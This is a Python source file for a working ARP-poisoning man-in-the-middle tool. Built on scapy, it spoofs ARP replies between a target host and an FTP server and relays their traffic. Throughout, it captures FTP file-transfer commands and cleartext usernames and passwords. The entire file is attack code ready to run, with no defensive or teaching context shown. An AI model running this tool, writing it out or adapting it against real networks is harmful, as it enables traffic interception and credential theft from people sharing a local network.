from functools import partial
import scapy.all as scapy
import ipaddress
import netifaces
import argparse
import re
import os

mac_cache = {}
detected_users = set()
detected_passwords = set()

def get_cached_mac(ip, args):
    if ip not in mac_cache:
        mac_cache[ip] = get_mac(ip=ip, args=args)
    return mac_cache[ip]

def get_mac(ip, args):
        arp_request = scapy.ARP(op=1, pdst=ip)
        ether = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
        packet = ether / arp_request
        response = scapy.srp(packet, iface=args.interf, timeout=2, verbose=args.v)[0]
        if response:
            return response[0][1].hwsrc
        else:
            raise Exception(f'Unable to resolve MAC address of IP {ip}')

def spoof(args):
    target_spoof = scapy.ARP(op=2, pdst=args.IP_target, psrc=args.IP_src, hwsrc=args.MAC_src, hwdst=args.MAC_target)
    target_packet = scapy.Ether(dst=args.MAC_target) / target_spoof
    scapy.sendp(target_packet, iface=args.interf, verbose=False)

    ftp_mac = get_cached_mac(args.IP_src, args)
    server_spoof = scapy.ARP(op=2, pdst=args.IP_src, psrc=args.IP_target, hwsrc=args.MAC_src, hwdst=ftp_mac)
    server_packet = scapy.Ether(dst=ftp_mac) / server_spoof
    scapy.sendp(server_packet, iface=args.interf, verbose=False)

def relay_packets(pkt, args):
    if pkt.haslayer('IP'):
        if pkt['IP'].dst == args.IP_src:
            pkt['Ether'].dst = get_cached_mac(args.IP_src,args)
            scapy.sendp(pkt, iface=args.interf, verbose=False)
        elif pkt['IP'].dst == args.IP_target:
            pkt['Ether'].dst = get_cached_mac(args.IP_target, args)
            scapy.sendp(pkt, iface=args.interf, verbose=False)

def packet_callback(pkt, args):
    if pkt.haslayer('ARP'):
        sender_mac = pkt['Ether'].src
        sender_ip = pkt['ARP'].psrc
        target_ip = pkt['ARP'].pdst
        if sender_mac == args.MAC_target and sender_ip == args.IP_target and target_ip == args.IP_src:
            print(f"ARP Request - Sender MAC: {sender_mac}, Sender IP: {sender_ip}, Target IP: {target_ip}")
            spoof(args)

    elif pkt.haslayer('TCP') and pkt.haslayer('IP'):
        if pkt['TCP'].dport == 21 or pkt['TCP'].sport == 21:
            if hasattr(pkt, 'load'):
                payload = pkt.load.decode('utf-8', errors='ignore')
                if payload.startswith(('STOR','RETR')):
                    command, file_name = payload.split(' ', 1)
                    print(f"Command: {command}, File Name: {file_name.strip()}")
                if args.v == True:
                    if payload.startswith('USER'):
                        username = payload.split(' ', 1)[1]
                        if username not in detected_users:
                            print(f"FTP Login Attempt - Username: {username}")
                            detected_users.add(username)
                    elif payload.startswith('PASS'):
                        password = payload.split(' ', 1)[1]
                        if password not in detected_passwords:
                            print(f"FTP Login Attempt - Password: {password}")
                            detected_passwords.add(password)
        relay_packets(pkt, args)

def sniff_for_packets(args):
    #try:
        while True:
            scapy.sniff(
                iface=args.interf,
                prn=lambda pkt: packet_callback(pkt, args),
                store=False
            )
    #except KeyboardInterrupt:
    #    print ('\nStopping program.')
    #except Exception as e:
    #    print(f'Exception caught: {e}')


def main():
    if os.geteuid() != 0:
        exit('You have to run the progam as sudo')
    parser = argparse.ArgumentParser(description='Arp poisoning and ftp network capture')
    parser.add_argument('IP_src', type=str, help='Requested IP address to capture')
    parser.add_argument('MAC_src', type=str, help='MAC address used for spoofing arp tables')
    parser.add_argument('IP_target', type=str, help='Requestor IP address')
    parser.add_argument('MAC_target', type=str, help='Requestor MAC address')
    parser.add_argument('interf', type=str, help='Interface to listen on')
    parser.add_argument('-v', action='store_true', default=False, help='Verbose mode')
    args = parser.parse_args()

#    try:
    if not re.match("[0-9a-f]{2}([-:]?)[0-9a-f]{2}(\\1[0-9a-f]{2}){4}$", args.MAC_src.lower()):
        raise Exception(f'{args.MAC_src} is an invalid mac address')
    if not re.match("[0-9a-f]{2}([-:]?)[0-9a-f]{2}(\\1[0-9a-f]{2}){4}$", args.MAC_target.lower()):
        raise Exception(f'{args.MAC_target} is an invalid mac address')
    s_ip = ipaddress.IPv4Address(args.IP_src)
    t_ip=ipaddress.IPv4Address(args.IP_target)
    if args.interf not in netifaces.interfaces():
        raise Exception(f'{args.interf} is not an available interface')
    sniff_for_packets(args)
#    except Exception as e:
#        parser.error(e)
#    except KeyboardInterrupt as e:
#        print(e)
#        return (0)

if __name__=='__main__':
    main()
